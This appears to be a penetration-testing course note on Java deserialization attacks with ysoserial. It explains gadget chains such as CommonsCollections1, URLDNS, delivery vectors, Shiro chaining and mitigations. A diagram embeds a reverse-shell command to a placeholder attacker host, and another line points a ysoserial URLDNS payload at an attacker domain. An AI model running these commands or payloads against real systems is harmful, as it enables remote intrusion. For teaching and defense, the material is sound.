---
tags: [web, advanced, enterprise, deserialization, vapt]
difficulty: advanced
module: "80 - Enterprise Web Apps: WebLogic, ColdFusion, Liferay"
topic: "80.05 Java Deserialization ysoserial Deep Dive"
---

# Java Deserialization ysoserial Deep Dive

## 1. Introduction to Java Deserialization

Java Object Serialization is a core API native to the Java language that allows complex Java objects to be converted into a stream of bytes. This byte stream can then be transmitted over a network, saved to a file, or stored in a database, and later reconstructed (deserialized) back into the exact original Java object on the receiving end. 

The fundamental security issue arises during the reconstruction phase. The Java `ObjectInputStream.readObject()` method, which performs the deserialization, automatically executes specific "magic methods" on the object being reconstructed, such as `readObject()`, `readResolve()`, or `finalize()`. If an application unconditionally deserializes untrusted data, an attacker can manipulate the serialized data stream to force the application to instantiate arbitrary classes available on the JVM's classpath and execute their internal logic.

The pivotal tool that automated and revolutionized the exploitation of this vulnerability class is **`ysoserial`**, created by Chris Frohoff and Gabriel Lawrence.

---

## 2. What are Gadgets and Gadget Chains?

A **Gadget** is a class available on the target application's classpath that has executable code within its deserialization routines (e.g., its own custom `readObject` method) or methods that can be indirectly invoked during deserialization. 

A single gadget is rarely enough to achieve Remote Code Execution (RCE). Instead, attackers string together multiple gadgets to form a **Gadget Chain**.
1. **Kick-off Gadget (Trigger):** A class whose `readObject()` method automatically calls a method on an attacker-controlled property.
2. **Intermediate Gadgets:** Classes that use Java Reflection or dynamic proxies to map harmless method calls into dangerous ones.
3. **Sink Gadget:** The final class that executes the dangerous operation, such as `java.lang.Runtime.getRuntime().exec()`.

---

## 3. The Anatomy of ysoserial

`ysoserial` is a proof-of-concept tool for generating payloads that exploit unsafe Java object deserialization. It is essentially a collection of pre-discovered gadget chains targeting widely used third-party Java libraries (like Apache Commons Collections, Hibernate, Spring, and Groovy).

When you run `ysoserial`, you specify a payload type (the gadget chain) and a command to execute. The tool dynamically constructs the malicious object graph in memory and then serializes it out to standard output.

### Commonysoserial Syntax
```bash
java -jar ysoserial.jar [GadgetChain] '[Command]' > payload.bin
```

---

## 4. Deep Dive: CommonsCollections1 Gadget Chain

To truly understand ysoserial, we must dissect its most famous payload: **CommonsCollections1**. This chain targets Apache Commons Collections versions <= 3.2.1, a library so ubiquitous it was present in almost every Java enterprise application.

### The Sink: `InvokerTransformer`
The core of this chain is the `InvokerTransformer` class. Its purpose is to take an input object and invoke a specific method on it using Java Reflection.
```java
public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) { ... }

public Object transform(Object input) {
    // Uses reflection to invoke 'methodName' on 'input'
    return input.getClass().getMethod(methodName, paramTypes).invoke(input, args);
}
```
If an attacker controls the parameters of `InvokerTransformer`, they can invoke *any* method on *any* object. ysoserial chains multiple `InvokerTransformer` objects together using a `ChainedTransformer` to call `Runtime.getRuntime().exec()`.

### The Bridge: `TransformedMap` or `LazyMap`
The attacker needs something to automatically call `transform()` on their malicious `ChainedTransformer` during deserialization. `LazyMap` (another class in Commons Collections) will call `transform()` automatically if someone tries to get a key from it that doesn't exist.

### The Trigger: `AnnotationInvocationHandler`
Finally, the attacker needs a kick-off gadget—a class built into Java itself whose `readObject()` method interacts with Maps. The internal Java class `sun.reflect.annotation.AnnotationInvocationHandler` is perfect. When deserialized, its `readObject()` method iterates over a Map provided to it. 
If the attacker supplies a `LazyMap` containing the `ChainedTransformer`, the iteration triggers the missing key lookup, which triggers the transformer, which executes the shell command.

---

## 5. ASCII Diagram: Gadget Chain Execution Flow

Below is an ASCII representation of the complete execution flow when the CommonsCollections1 payload is deserialized by a vulnerable server.

```text
+--------------------------------------------------------------------------+
|  Vulnerable Server JVM (ObjectInputStream.readObject())                  |
+--------------------------------------------------------------------------+
                                    |
                                    v
 1. Deserializes Kick-off Gadget: [sun.reflect.annotation.AnnotationInvocationHandler]
                                    |
    (Inside its readObject() method, it accesses elements of an internal Map)
                                    |
                                    v
 2. Map triggers Bridge Gadget:   [org.apache.commons.collections.map.LazyMap]
                                    |
    (LazyMap tries to populate a missing key by calling transform() on its factory)
                                    |
                                    v
 3. Bridge calls Sink Gadget:     [org.apache.commons.collections.functors.ChainedTransformer]
                                    |
    (Iterates through an array of InvokerTransformers, passing output to input)
                                    |
                                    v
 4. Reflection Execution:
    a. InvokerTransformer 1 ->  java.lang.Runtime.getMethod("getRuntime")
    b. InvokerTransformer 2 ->  getRuntime.invoke()  [Returns Runtime instance]
    c. InvokerTransformer 3 ->  Runtime.exec("bash -i >& /dev/tcp/attck/444 0>&1")
                                    |
                                    v
+--------------------------------------------------------------------------+
|  OS Level Execution: Reverse Shell Sent to Attacker                      |
+--------------------------------------------------------------------------+
```

---

## 6. JNDI Injection and Advanced Payloads

While executing direct OS commands is ideal, many environments prevent this through security managers or strict egress filtering. `ysoserial` contains payloads specifically for these scenarios.

### Out of Band (OOB) Testing: URLDNS
The `URLDNS` gadget is unique because it uses *no third-party libraries*; it relies entirely on built-in Java classes (`java.util.HashMap` and `java.net.URL`). 
When a `HashMap` is deserialized, it recalculates the hash of its keys. If a key is a `java.net.URL` object, Java will perform a DNS lookup on that URL to resolve its IP address for the hash calculation.
```bash
java -jar ysoserial.jar URLDNS "http://attacker-controlled-subdomain.com" > dns.bin
```
This allows an attacker to definitively prove that Java deserialization is occurring on the target, completely blind, bypassing all WAFs and without executing any OS commands.

### JNDI Forwarding: JRMPClient
If a target has updated its libraries (fixing Commons Collections), attackers can use the `JRMPClient` gadget (which uses built-in RMI classes). When deserialized, this gadget makes an outbound connection to an attacker-controlled RMI server. The attacker's server then responds with a secondary malicious serialized object (like a newer Commons Collections gadget), bypassing the initial entry point's restrictions.

---

## 7. Delivery Mechanisms

Serialized objects are binary data. They must be appropriately encoded to be transmitted via web protocols.
- **Raw Binary:** Sent directly over sockets in protocols like RMI, JMX, or WebLogic T3. Look for the magic bytes `AC ED 00 05` (Hex) or `rO0AB` (Base64).
- **HTTP Headers/Parameters:** Often Base64 encoded and passed in cookies (e.g., `rememberMe` in Apache Shiro), hidden form fields, or ViewState parameters.
- **XML/JSON Wrappers:** Embedded within XML elements if the application uses mechanisms like `XStream` or `XMLDecoder`.

---

## 8. Defenses and Mitigation

1. **Do Not Deserialize Untrusted Data:** This is the only bulletproof fix. Architectures should migrate to safer data exchange formats like standard JSON (using secure parsers like Jackson or Gson with polymorphic typing strictly controlled).
2. **ObjectInputFilters (JEP 290):** Introduced in modern Java versions, this allows developers to define strict whitelists of classes that are allowed to be deserialized.
   ```java
   ObjectInputFilter filter = ObjectInputFilter.Config.createFilter("com.myapp.safe.*;!*");
   ois.setObjectInputFilter(filter);
   ```
3. **Library Updates:** Update all dependencies. Modern versions of Apache Commons Collections, Spring, and Hibernate have removed or neutered the classes that allowed these gadget chains to function.
4. **WAF Signatures:** Block HTTP requests containing the Base64 signature `rO0AB` or hex `ACED0005`, though this only protects HTTP vectors, not raw socket vectors.

---

## 9. Chaining Opportunities

- **Apache Shiro Authentication Bypass to RCE:** Apache Shiro uses Java serialization for its `rememberMe` cookie. If an attacker can extract or guess the AES key used to encrypt the cookie, they can encrypt a `ysoserial` payload and pass it in the cookie, achieving pre-auth RCE.
- **File Upload to Deserialization:** If an application allows file uploads and later attempts to parse the file using a vulnerable deserializer (e.g., uploading an XML file parsed by `XStream`), an attacker can upload an XML representation of a ysoserial payload.

---

## 10. Related Notes

- [[01 - Oracle WebLogic Deserialization Vulnerabilities]] - Demonstrates how ysoserial payloads are wrapped and delivered over the proprietary T3 protocol.
- [[02 - Exploiting Adobe ColdFusion Server Vulnerabilities]] - Explores how deserialization impacts AMF and WDDX parsing within the ColdFusion engine.
- [[03 - Liferay Portal Exploitation Techniques]] - Highlights how JSON-based deserializers (like Flexjson) differ from native Java binary serialization.
- [[04 - Apache Struts Remote Code Execution]] - Compares OGNL evaluation vulnerabilities against binary deserialization flaws.
